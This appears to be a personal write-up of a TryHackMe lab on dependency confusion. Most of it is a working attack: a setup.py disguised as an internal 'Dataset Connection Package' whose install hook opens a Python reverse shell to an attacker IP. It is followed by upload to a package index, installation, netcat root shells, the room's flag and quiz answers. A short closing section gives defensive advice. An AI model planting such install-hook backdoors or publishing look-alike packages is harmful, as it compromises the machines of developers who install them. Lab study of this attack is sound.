        url='https://github.com/labs/datadbconnect/',
        download_url='https://github.com/labs/datadbconnect/archive/{}.tar.gz'.format(VERSION),
        author='Tinus Green',
        author_email='tinus@notmyrealemail.com',
        version=VERSION,
        packages=find_packages(),
        include_package_data=True,
        license='MIT',
        description=('''Dataset Connection Package '''
                  '''that can be used internally to connect to data sources '''),
        cmdclass={
            'install': PostInstallCommand
        },
)

┌──(witty㉿kali)-[~/Downloads/confusion_dependency]
└─$ python3 setup.py sdist
/usr/lib/python3/dist-packages/setuptools/dist.py:529: UserWarning: Normalizing 'v9000.0.2' to '9000.0.2'
  warnings.warn(tmpl.format(**locals()))
running sdist
running egg_info
creating datadbconnect.egg-info
writing datadbconnect.egg-info/PKG-INFO
writing dependency_links to datadbconnect.egg-info/dependency_links.txt
writing top-level names to datadbconnect.egg-info/top_level.txt
writing manifest file 'datadbconnect.egg-info/SOURCES.txt'
reading manifest file 'datadbconnect.egg-info/SOURCES.txt'
writing manifest file 'datadbconnect.egg-info/SOURCES.txt'
warning: sdist: standard file not found: should have one of README, README.rst, README.txt, README.md

running check
creating datadbconnect-9000.0.2
creating datadbconnect-9000.0.2/datadbconnect.egg-info
copying files to datadbconnect-9000.0.2...
copying setup.py -> datadbconnect-9000.0.2
copying datadbconnect.egg-info/PKG-INFO -> datadbconnect-9000.0.2/datadbconnect.egg-info
copying datadbconnect.egg-info/SOURCES.txt -> datadbconnect-9000.0.2/datadbconnect.egg-info
copying datadbconnect.egg-info/dependency_links.txt -> datadbconnect-9000.0.2/datadbconnect.egg-info
copying datadbconnect.egg-info/top_level.txt -> datadbconnect-9000.0.2/datadbconnect.egg-info
Writing datadbconnect-9000.0.2/setup.cfg
creating dist
Creating tar archive
removing 'datadbconnect-9000.0.2' (and everything under it)

┌──(witty㉿kali)-[~/Downloads/confusion_dependency]
└─$ ls
datadbconnect.egg-info  dist  main.py  setup.py

┌──(witty㉿kali)-[~/Downloads/confusion_dependency]
└─$ twine upload dist/datadbconnect-9000.0.2.tar.gz --repository-url http://external.pypi-server.loc:8080
Uploading distributions to http://external.pypi-server.loc:8080
Enter your username: 
WARNING  Your username is empty. Did you enter it correctly?                       
WARNING  See https://twine.readthedocs.io/#entering-credentials for more           
         information.                                                              
Enter your password: 
WARNING  Your password is empty. Did you enter it correctly?                       
WARNING  See https://twine.readthedocs.io/#entering-credentials for more           
         information.                                                              
Uploading datadbconnect-9000.0.2.tar.gz
100% ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 4.0/4.0 kB • 00:00 • ?

──(witty㉿kali)-[~/Downloads]
└─$ pip3 install datadbconnect --trusted-host external.pypi-server.loc --index-url http://external.pypi-server.loc:8080 --verbose
Using pip 23.0 from /usr/local/lib/python3.11/dist-packages/pip (python 3.11)
Defaulting to user installation because normal site-packages is not writeable
Looking in indexes: http://external.pypi-server.loc:8080
Collecting datadbconnect
  Downloading http://external.pypi-server.loc:8080/packages/datadbconnect-9000.0.2.tar.gz (1.3 kB)
  Running command python setup.py egg_info
  /usr/lib/python3/dist-packages/setuptools/dist.py:529: UserWarning: Normalizing 'v9000.0.2' to '9000.0.2'
    warnings.warn(tmpl.format(**locals()))
  running egg_info
  creating /tmp/pip-pip-egg-info-qwbb3cpy/datadbconnect.egg-info
  writing /tmp/pip-pip-egg-info-qwbb3cpy/datadbconnect.egg-info/PKG-INFO
  writing dependency_links to /tmp/pip-pip-egg-info-qwbb3cpy/datadbconnect.egg-info/dependency_links.txt
  writing top-level names to /tmp/pip-pip-egg-info-qwbb3cpy/datadbconnect.egg-info/top_level.txt
  writing manifest file '/tmp/pip-pip-egg-info-qwbb3cpy/datadbconnect.egg-info/SOURCES.txt'
  reading manifest file '/tmp/pip-pip-egg-info-qwbb3cpy/datadbconnect.egg-info/SOURCES.txt'
  writing manifest file '/tmp/pip-pip-egg-info-qwbb3cpy/datadbconnect.egg-info/SOURCES.txt'
  Preparing metadata (setup.py) ... done
Building wheels for collected packages: datadbconnect
  Running command python setup.py bdist_wheel
  /usr/lib/python3/dist-packages/setuptools/dist.py:529: UserWarning: Normalizing 'v9000.0.2' to '9000.0.2'
    warnings.warn(tmpl.format(**locals()))
  running bdist_wheel
  running build
  /usr/lib/python3/dist-packages/setuptools/command/install.py:34: SetuptoolsDeprecationWarning: setup.py install is deprecated. Use build and pip and other standards-based tools.
    warnings.warn(
  installing to build/bdist.linux-x86_64/wheel
  running install
  running install_egg_info
  running egg_info
  writing datadbconnect.egg-info/PKG-INFO
  writing dependency_links to datadbconnect.egg-info/dependency_links.txt
  writing top-level names to datadbconnect.egg-info/top_level.txt
  reading manifest file 'datadbconnect.egg-info/SOURCES.txt'
  writing manifest file 'datadbconnect.egg-info/SOURCES.txt'
  Copying datadbconnect.egg-info to build/bdist.linux-x86_64/wheel/datadbconnect-9000.0.2.egg-info
  running install_scripts
  Hello World from installer, this proves our injection works



┌──(witty㉿kali)-[~/Downloads/confusion_dependency]
└─$ rlwrap nc -lvnp 8080
listening on [any] 8080 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.68.245] 55124
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# ls
PKG-INFO
build
datadbconnect.egg-info
pip-delete-this-directory.txt
pip-egg-info
setup.cfg
setup.py
# cd /root
# ls
flag.txt
# cat flag.txt
THM{RCE.Through.Dependency.Confusion}
# cd /
# ls -lah
total 76K
drwxr-xr-x   1 root root 4.0K Feb 22 21:52 .
drwxr-xr-x   1 root root 4.0K Feb 22 21:52 ..
-rwxr-xr-x   1 root root    0 Feb 22 21:52 .dockerenv
drwxr-xr-x   2 root root 4.0K Aug  1  2022 bin
drwxr-xr-x   2 root root 4.0K Apr 24  2018 boot
drwxr-xr-x   5 root root  340 Feb 22 21:52 dev
drwxr-xr-x   1 root root 4.0K Feb 22 21:52 etc
drwxr-xr-x   2 root root 4.0K Apr 24  2018 home
drwxr-xr-x   1 root root 4.0K Aug  9  2022 lib
drwxr-xr-x   2 root root 4.0K Aug  1  2022 lib64
drwxr-xr-x   2 root root 4.0K Aug  1  2022 media
drwxr-xr-x   2 root root 4.0K Aug  1  2022 mnt
drwxr-xr-x   2 root root 4.0K Aug  1  2022 opt
dr-xr-xr-x 137 root root    0 Feb 22 21:52 proc
drwx------   1 root root 4.0K Aug  9  2022 root
drwxr-xr-x   5 root root 4.0K Aug  1  2022 run
drwxr-xr-x   2 root root 4.0K Aug  1  2022 sbin
drwxr-xr-x   2 root root 4.0K Aug  1  2022 srv
dr-xr-xr-x  13 root root    0 Feb 22 21:52 sys
drwxrwxrwt   1 root root 4.0K Feb 22 21:53 tmp
drwxr-xr-x   1 root root 4.0K Aug  1  2022 usr
drwxr-xr-x   1 root root 4.0K Aug  1  2022 var

┌──(witty㉿kali)-[~/Downloads]
└─$ pip3 uninstall datadbconnect

Found existing installation: datadbconnect 9000.0.2
Uninstalling datadbconnect-9000.0.2:
  Would remove:
    /home/witty/.local/lib/python3.11/site-packages/datadbconnect-9000.0.2.dist-info/*
Proceed (Y/n)? Y
  Successfully uninstalled datadbconnect-9000.0.2


┌──(witty㉿kali)-[~/Downloads/confusion_dependency]
└─$ rlwrap nc -lvnp 8080
listening on [any] 8080 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.68.245] 55166
/bin/sh: 0: can't access tty; job control turned off
# ls
PKG-INFO
build
datadbconnect.egg-info
pip-delete-this-directory.txt
pip-egg-info
setup.cfg
setup.py
# cat pip-delete-this-directory.txt
This file is placed here by pip to indicate the source was put
here by pip.

Once this package is successfully installed this source code will be
deleted (unless you remove this file).
# cat setup.py
from setuptools import find_packages
from setuptools import setup
from setuptools.command.install import install
import os
import sys

VERSION = 'v9000.0.2'

class PostInstallCommand(install):
     def run(self):
         install.run(self)
         print ("Hello World from installer, this proves our injection works")
         os.system('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.19.103",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'')

setup(
        name='datadbconnect',
        url='https://github.com/labs/datadbconnect/',
        download_url='https://github.com/labs/datadbconnect/archive/{}.tar.gz'.format(VERSION),
        author='Tinus Green',
        author_email='tinus@notmyrealemail.com',
        version=VERSION,
        packages=find_packages(),
        include_package_data=True,
        license='MIT',
        description=('''Dataset Connection Package '''
                  '''that can be used internally to connect to data sources '''),
        cmdclass={
            'install': PostInstallCommand
        },
)

```


What is the name of the attack that can be launched to create a race condition between internal and external dependencies with the same name?  

*Dependency Confusion*

What is the flag's value that is stored in the /root/ directory on the docker container where you get remote code execution?

*THM{RCE.Through.Dependency.Confusion}*


###  Conclusion

In this room, we discussed the security controls and misconfigurations commonly found with dependency management. This is by no means an exhaustive list of what should be considered for the security of dependencies. However, to summarise, we should be considering the following:

-   Be aware of the dependencies you use in your applications and systems. Also, be aware that these dependencies may have dependencies, which will grow the list of dependencies you will need to keep tabs on.
-   Make sure to always use the latest versions of dependencies, both internal and external dependencies. More often than not, these updates to dependencies are not to introduce new features but to fix existing issues and bugs.
-   It is not just the dependencies themselves that should be considered for security, but also how we configure and use our dependency managers, especially for internal dependencies.
-   Dependencies and dependency management systems should be included in the attack surface of the application or system we are developing.  
    

Answer the questions below

I understand that security should be taken seriously for dependencies and dependency management in the DevOps pipeline.  

Question Done

```

root@ip-10-10-183-87:~# pip3 install datadbconnect --trusted-host external.pypi-server.loc --index-url http://external.pypi-server.loc:8080 --verbose
Using pip 22.1 from /usr/local/lib/python3.9/dist-packages/pip (python 3.9)
Looking in indexes: http://external.pypi-server.loc:8080
Collecting datadbconnect
  Downloading http://external.pypi-server.loc:8080/packages/datadbconnect-9000.0.2.tar.gz (1.3 kB)
  Running command python setup.py egg_info
  /usr/local/lib/python3.9/dist-packages/setuptools/dist.py:526: UserWarning: Normalizing 'v9000.0.2' to '9000.0.2'
    warnings.warn(tmpl.format(**locals()))
  running egg_info
  creating /tmp/pip-pip-egg-info-o1bcv45w/datadbconnect.egg-info
  writing /tmp/pip-pip-egg-info-o1bcv45w/datadbconnect.egg-info/PKG-INFO
  writing dependency_links to /tmp/pip-pip-egg-info-o1bcv45w/datadbconnect.egg-info/dependency_links.txt
  writing top-level names to /tmp/pip-pip-egg-info-o1bcv45w/datadbconnect.egg-info/top_level.txt
  writing manifest file '/tmp/pip-pip-egg-info-o1bcv45w/datadbconnect.egg-info/SOURCES.txt'
  reading manifest file '/tmp/pip-pip-egg-info-o1bcv45w/datadbconnect.egg-info/SOURCES.txt'
  writing manifest file '/tmp/pip-pip-egg-info-o1bcv45w/datadbconnect.egg-info/SOURCES.txt'
  Preparing metadata (setup.py) ... done
Building wheels for collected packages: datadbconnect
  Running command python setup.py bdist_wheel
  /usr/local/lib/python3.9/dist-packages/setuptools/dist.py:526: UserWarning: Normalizing 'v9000.0.2' to '9000.0.2'
    warnings.warn(tmpl.format(**locals()))
  running bdist_wheel
  running build
  /usr/local/lib/python3.9/dist-packages/setuptools/command/install.py:34: SetuptoolsDeprecationWarning: setup.py install is deprecated. Use build and pip and other standards-based tools.
    warnings.warn(
  installing to build/bdist.linux-x86_64/wheel
  running install
  running install_egg_info
  running egg_info
  writing datadbconnect.egg-info/PKG-INFO
  writing dependency_links to datadbconnect.egg-info/dependency_links.txt
  writing top-level names to datadbconnect.egg-info/top_level.txt
  reading manifest file 'datadbconnect.egg-info/SOURCES.txt'
  writing manifest file 'datadbconnect.egg-info/SOURCES.txt'
  Copying datadbconnect.egg-info to build/bdist.linux-x86_64/wheel/datadbconnect-9000.0.2-py3.9.egg-info
  running install_scripts
  Hello World from installer, this proves our injection works
  
┌──(witty㉿kali)-[~/Downloads/confusion_dependency]
└─$ rlwrap nc -lvnp 8080
listening on [any] 8080 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.183.87] 40756
# ls
build
datadbconnect.egg-info
PKG-INFO
setup.cfg
setup.py
# cd /root
# ls
Desktop
Downloads
Instructions
Pictures
Postman
Rooms
Scripts
thinclient_drives
Tools
# cd Rooms
# ls
ADEnumeration
AoC3
BPVolatility
BreachingAD
cryptographyintro
ctf-event-2022
CVE2022-26134
CVE2022-26923
ExploitingAD
Follina-MSDT
introdigitalforensics
OhSINT
sigma
solar
SplunkBasic
Spring4Shell
Wireshark101

Works !
```


[[CCT2019]]